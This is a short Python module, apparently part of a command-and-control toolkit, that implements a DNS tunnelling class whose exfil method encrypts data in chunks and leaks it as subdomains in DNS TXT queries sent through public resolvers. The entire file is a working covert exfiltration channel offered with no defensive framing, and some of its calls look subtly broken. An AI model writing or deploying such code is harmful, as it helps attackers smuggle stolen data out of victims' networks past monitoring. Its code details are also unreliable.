# src/operators/c2_protocols/dns_tunneling.py
import dns.resolver
import base64
import random
from cryptography.fernet import Fernet

class DNSTunnel:
    def __init__(self, domain="test.internal", encryption_key=None):
        self.nameservers = ["1.1.1.1", "8.8.8.8"]
        self.domain = domain
        self.subdomains = ["cdn", "api", "assets"]
        self.cipher = Fernet(encryption_key or Fernet.generate_key())

    def _encrypt(self, data: bytes) -> str:
        """AEAD-encrypted payload with timestamp"""
        return base64.b32encode(
            self.cipher.encrypt(data)
        ).decode().rstrip('=')

    def exfil(self, data: bytes, chunk_size=48):
        for i in range(0, len(data), chunk_size):
            sub = random.SystemRandom().choice(self.subdomains)
            host = f"{self._encrypt(data[i:i+chunk_size])}.{sub}.{self.domain}"
            try:
                dns.resolver.resolve(host, 'TXT', 
                    nameserver=random.choice(self.nameservers))
            except dns.exception.DNSException:
                pass